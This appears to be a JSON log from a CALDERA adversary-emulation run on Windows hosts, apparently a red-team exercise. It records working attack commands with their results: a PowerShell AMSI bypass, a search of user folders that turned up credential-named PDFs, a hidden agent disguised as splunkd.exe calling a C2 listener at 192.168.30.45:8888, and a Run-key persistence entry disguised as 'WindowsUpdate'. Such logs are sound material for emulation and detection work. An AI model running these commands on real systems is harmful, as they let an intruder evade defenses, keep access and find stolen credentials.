@@ -1,0 +1,502 @@
+[
+  {
+    "id": "bc5979b1-c7fe-4fc2-86c2-66766a296ca9",
+    "paw": "rjgyoy",
+    "command": "whoamiwhoami /privnet usernet localgroup administrators",
+    "plaintext_command": "whoamiwhoami /privnet usernet localgroup administrators",
+    "status": -3,
+    "score": 0,
+    "decide": "2026-04-02T09:03:43Z",
+    "pin": 0,
+    "pid": null,
+    "facts": [],
+    "relationships": [],
+    "used": [],
+    "unique": "bc5979b1-c7fe-4fc2-86c2-66766a296ca9",
+    "collect": null,
+    "finish": null,
+    "ability": {
+      "ability_id": "discovery_users",
+      "tactic": "discovery",
+      "technique_name": "System Owner/User Discovery",
+      "technique_id": "T1033",
+      "name": "User Discovery",
+      "description": "Enumerate current identity, privileges, and administrators.",
+      "executors": [
+        {
+          "name": "psh",
+          "platform": "windows",
+          "command": "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        }
+      ],
+      "requirements": [],
+      "privilege": null,
+      "repeatable": false,
+      "buckets": [
+        "discovery"
+      ],
+      "additional_info": {},
+      "access": {},
+      "singleton": false,
+      "plugin": "",
+      "delete_payload": true
+    },
+    "executor": {
+      "name": "psh",
+      "platform": "windows",
+      "command": "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n",
+      "code": null,
+      "language": null,
+      "build_target": null,
+      "payloads": [],
+      "uploads": [],
+      "timeout": 60,
+      "parsers": [],
+      "cleanup": [],
+      "variations": [],
+      "additional_info": {}
+    },
+    "cleanup": 0,
+    "visibility": {
+      "score": 50,
+      "adjustments": []
+    },
+    "host": "DESKTOP-FGTR6H4",
+    "output": "False",
+    "deadman": false
+  },
+  {
+    "id": "b4b805ad-a3a0-4e42-bc07-0df3afbb088e",
+    "paw": "qdodkl",
+    "command": "whoamiwhoami /privnet usernet localgroup administrators",
+    "plaintext_command": "whoamiwhoami /privnet usernet localgroup administrators",
+    "status": 1,
+    "score": 0,
+    "decide": "2026-04-02T09:03:43Z",
+    "pin": 0,
+    "pid": "5412",
+    "facts": [],
+    "relationships": [],
+    "used": [],
+    "unique": "b4b805ad-a3a0-4e42-bc07-0df3afbb088e",
+    "collect": "2026-04-02T09:04:31Z",
+    "finish": "2026-04-02T09:04:34Z",
+    "ability": {
+      "ability_id": "discovery_users",
+      "tactic": "discovery",
+      "technique_name": "System Owner/User Discovery",
+      "technique_id": "T1033",
+      "name": "User Discovery",
+      "description": "Enumerate current identity, privileges, and administrators.",
+      "executors": [
+        {
+          "name": "psh",
+          "platform": "windows",
+          "command": "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        }
+      ],
+      "requirements": [],
+      "privilege": null,
+      "repeatable": false,
+      "buckets": [
+        "discovery"
+      ],
+      "additional_info": {},
+      "access": {},
+      "singleton": false,
+      "plugin": "",
+      "delete_payload": true
+    },
+    "executor": {
+      "name": "psh",
+      "platform": "windows",
+      "command": "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n",
+      "code": null,
+      "language": null,
+      "build_target": null,
+      "payloads": [],
+      "uploads": [],
+      "timeout": 60,
+      "parsers": [],
+      "cleanup": [],
+      "variations": [],
+      "additional_info": {}
+    },
+    "cleanup": 0,
+    "visibility": {
+      "score": 50,
+      "adjustments": []
+    },
+    "host": "PDL2",
+    "output": "True",
+    "deadman": false,
+    "agent_reported_time": "2026-04-02T09:04:29Z"
+  },
+  {
+    "id": "67e70b81-06f4-4322-8fde-9c706d7e891c",
+    "paw": "qdodkl",
+    "command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$s.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)",
+    "plaintext_command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$s.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)",
+    "status": 0,
+    "score": 0,
+    "decide": "2026-04-02T09:05:03Z",
+    "pin": 0,
+    "pid": "6336",
+    "facts": [],
+    "relationships": [],
+    "used": [],
+    "unique": "67e70b81-06f4-4322-8fde-9c706d7e891c",
+    "collect": "2026-04-02T09:05:29Z",
+    "finish": "2026-04-02T09:05:29Z",
+    "ability": {
+      "ability_id": "amsi_bypass",
+      "tactic": "defense-evasion",
+      "technique_name": "Impair Defenses",
+      "technique_id": "T1562.001",
+      "name": "AMSI Bypass",
+      "description": "Disable AMSI for the current PowerShell runspace.",
+      "executors": [
+        {
+          "name": "psh",
+          "platform": "windows",
+          "command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$s.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        }
+      ],
+      "requirements": [],
+      "privilege": null,
+      "repeatable": false,
+      "buckets": [
+        "defense-evasion"
+      ],
+      "additional_info": {},
+      "access": {},
+      "singleton": false,
+      "plugin": "",
+      "delete_payload": true
+    },
+    "executor": {
+      "name": "psh",
+      "platform": "windows",
+      "command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$s.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n",
+      "code": null,
+      "language": null,
+      "build_target": null,
+      "payloads": [],
+      "uploads": [],
+      "timeout": 60,
+      "parsers": [],
+      "cleanup": [],
+      "variations": [],
+      "additional_info": {}
+    },
+    "cleanup": 0,
+    "visibility": {
+      "score": 50,
+      "adjustments": []
+    },
+    "host": "PDL2",
+    "output": "False",
+    "deadman": false,
+    "agent_reported_time": "2026-04-02T09:05:27Z"
+  },
+  {
+    "id": "4b22883c-cfcf-4e14-a033-01e76aaf2a56",
+    "paw": "qdodkl",
+    "command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}",
+    "plaintext_command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}",
+    "status": 0,
+    "score": 0,
+    "decide": "2026-04-02T09:05:34Z",
+    "pin": 0,
+    "pid": "4148",
+    "facts": [
+      {
+        "unique": "host.file.pathC:\\Users\\Administrator\\Downloads\\Password_O365_Amministrazione.pdf",
+        "trait": "host.file.path",
+        "name": "host.file.path",
+        "value": "C:\\Users\\Administrator\\Downloads\\Password_O365_Amministrazione.pdf",
+        "created": "2026-04-02T09:06:25Z",
+        "score": 1,
+        "source": "c5911a68-7c29-471a-a964-f119c2ca949d",
+        "origin_type": "LEARNED",
+        "links": [
+          "4b22883c-cfcf-4e14-a033-01e76aaf2a56"
+        ],
+        "relationships": [],
+        "limit_count": -1,
+        "collected_by": [
+          "qdodkl"
+        ],
+        "technique_id": "T1005"
+      },
+      {
+        "unique": "host.file.pathC:\\Users\\Public\\Documents\\Elenco_Credenziali_Servizi.pdf",
+        "trait": "host.file.path",
+        "name": "host.file.path",
+        "value": "C:\\Users\\Public\\Documents\\Elenco_Credenziali_Servizi.pdf",
+        "created": "2026-04-02T09:06:25Z",
+        "score": 1,
+        "source": "c5911a68-7c29-471a-a964-f119c2ca949d",
+        "origin_type": "LEARNED",
+        "links": [
+          "4b22883c-cfcf-4e14-a033-01e76aaf2a56"
+        ],
+        "relationships": [],
+        "limit_count": -1,
+        "collected_by": [
+          "qdodkl"
+        ],
+        "technique_id": "T1005"
+      }
+    ],
+    "relationships": [],
+    "used": [],
+    "unique": "4b22883c-cfcf-4e14-a033-01e76aaf2a56",
+    "collect": "2026-04-02T09:06:23Z",
+    "finish": "2026-04-02T09:06:25Z",
+    "ability": {
+      "ability_id": "collection_files",
+      "tactic": "collection",
+      "technique_name": "Data from Local System",
+      "technique_id": "T1005",
+      "name": "Sensitive File Discovery",
+      "description": "Search for common document types under C:\\Users.",
+      "executors": [
+        {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 120,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        }
+      ],
+      "requirements": [],
+      "privilege": null,
+      "repeatable": false,
+      "buckets": [
+        "collection"
+      ],
+      "additional_info": {},
+      "access": {},
+      "singleton": false,
+      "plugin": "",
+      "delete_payload": true
+    },
+    "executor": {
+      "name": "psh",
+      "platform": "windows",
+      "command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n",
+      "code": null,
+      "language": null,
+      "build_target": null,
+      "payloads": [],
+      "uploads": [],
+      "timeout": 120,
+      "parsers": [],
+      "cleanup": [],
+      "variations": [],
+      "additional_info": {}
+    },
+    "cleanup": 0,
+    "visibility": {
+      "score": 50,
+      "adjustments": []
+    },
+    "host": "PDL2",
+    "output": "True",
+    "deadman": false,
+    "agent_reported_time": "2026-04-02T09:06:21Z"
+  },
+  {
+    "id": "b32eeea1-3e97-4841-8acc-2f379981f3e3",
+    "paw": "qdodkl",
+    "command": "Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `-WindowStyle Hidden",
+    "plaintext_command": "Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `-WindowStyle Hidden",
+    "status": 1,
+    "score": 0,
+    "decide": "2026-04-02T09:06:26Z",
+    "pin": 0,
+    "pid": "2036",
+    "facts": [],
+    "relationships": [],
+    "used": [],
+    "unique": "b32eeea1-3e97-4841-8acc-2f379981f3e3",
+    "collect": "2026-04-02T09:07:13Z",
+    "finish": "2026-04-02T09:07:13Z",
+    "ability": {
+      "ability_id": "c2_internal",
+      "tactic": "command-and-control",
+      "technique_name": "Application Layer Protocol",
+      "technique_id": "T1071.001",
+      "name": "Internal C2",
+      "description": "Start an agent process against the internal CALDERA HTTP listener.",
+      "executors": [
+        {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `\n-WindowStyle Hidden\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        }
+      ],
+      "requirements": [],
+      "privilege": null,
+      "repeatable": false,
+      "buckets": [
+        "command-and-control"
+      ],
+      "additional_info": {},
+      "access": {},
+      "singleton": false,
+      "plugin": "",
+      "delete_payload": true
+    },
+    "executor": {
+      "name": "psh",
+      "platform": "windows",
+      "command": "Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `\n-WindowStyle Hidden\n",
+      "code": null,
+      "language": null,
+      "build_target": null,
+      "payloads": [],
+      "uploads": [],
+      "timeout": 60,
+      "parsers": [],
+      "cleanup": [],
+      "variations": [],
+      "additional_info": {}
+    },
+    "cleanup": 0,
+    "visibility": {
+      "score": 50,
+      "adjustments": []
+    },
+    "host": "PDL2",
+    "output": "True",
+    "deadman": false,
+    "agent_reported_time": "2026-04-02T09:07:10Z"
+  },
+  {
+    "id": "cc9bf854-d295-455c-b6e6-841cfd818bb9",
+    "paw": "qdodkl",
+    "command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `-Name \"WindowsUpdate\" `-Value \"C:\\Users\\Public\\splunkd.exe\" -Force",
+    "plaintext_command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `-Name \"WindowsUpdate\" `-Value \"C:\\Users\\Public\\splunkd.exe\" -Force",
+    "status": 1,
+    "score": 0,
+    "decide": "2026-04-02T09:07:14Z",
+    "pin": 0,
+    "pid": "7988",
+    "facts": [],
+    "relationships": [],
+    "used": [],
+    "unique": "cc9bf854-d295-455c-b6e6-841cfd818bb9",
+    "collect": "2026-04-02T09:08:13Z",
+    "finish": "2026-04-02T09:08:14Z",
+    "ability": {
+      "ability_id": "persistence_registry",
+      "tactic": "persistence",
+      "technique_name": "Registry Run Keys / Startup Folder",
+      "technique_id": "T1547.001",
+      "name": "Registry Persistence",
+      "description": "Create a Run key for persistence.",
+      "executors": [
+        {
+          "name": "psh",
+          "platform": "windows",
+          "command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `\n-Name \"WindowsUpdate\" `\n-Value \"C:\\Users\\Public\\splunkd.exe\" -Force\n",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        }
+      ],
+      "requirements": [],
+      "privilege": null,
+      "repeatable": false,
+      "buckets": [
+        "persistence"
+      ],
+      "additional_info": {},
+      "access": {},
+      "singleton": false,
+      "plugin": "",
+      "delete_payload": true
+    },
+    "executor": {
+      "name": "psh",
+      "platform": "windows",
+      "command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `\n-Name \"WindowsUpdate\" `\n-Value \"C:\\Users\\Public\\splunkd.exe\" -Force\n",
+      "code": null,
+      "language": null,
+      "build_target": null,
+      "payloads": [],
+      "uploads": [],
+      "timeout": 60,
+      "parsers": [],
+      "cleanup": [],
+      "variations": [],
+      "additional_info": {}
+    },
+    "cleanup": 0,
+    "visibility": {
+      "score": 50,
+      "adjustments": []
+    },
+    "host": "PDL2",
+    "output": "True",
+    "deadman": false,
+    "agent_reported_time": "2026-04-02T09:08:11Z"
+  }
+]
